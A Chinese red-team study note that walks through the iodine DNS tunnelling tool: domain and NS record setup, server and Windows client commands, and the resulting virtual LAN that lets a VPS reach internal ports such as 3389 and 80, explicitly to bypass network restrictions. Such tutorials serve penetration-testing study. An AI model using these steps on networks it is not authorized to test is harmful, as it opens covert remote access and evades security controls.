---
title: 【内网学习笔记】9、iodine 使用
date: 2021-06-08 21:34:03
id: 210608-213403
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 1、介绍

iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 

iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。

iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。

## 2、安装

首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png)

Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装

```
sudo apt-get install iodine
```

Windows 可以直接到官网下载，下载地址：[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)，服务端名称是 iodined.exe，客户端是 iodine.exe

## 3、使用

这里服务端使用的是 Linux，服务端命令如下：

```
sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD
```

```
 -f		在前台运行
 -c		不检查传入请求的客户端 IP 地址
 -P		客户端与服务端之间的连接密码
 -D		调试级别，-D 表示第一级，-DD 表示第二级，依此类推
 
 192.168.77.1 是自己自定义的局域网虚拟 IP 地址。
```

这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 [http://www.qudong51.net/qudong/981.html](http://www.qudong51.net/qudong/981.html)

打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。

然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。

```
.\iodine.exe -f -r -P teamssix dc.teamssix.com
```

```
-r		iodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道
```

如果出现 `Connection setup complete, transmitting data.` 就表示 DNS 隧道就已经建立了。

这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png)

假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。

> 参考文章：
>
> [https://www.cnblogs.com/micr067/p/12263337.html](https://www.cnblogs.com/micr067/p/12263337.html)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
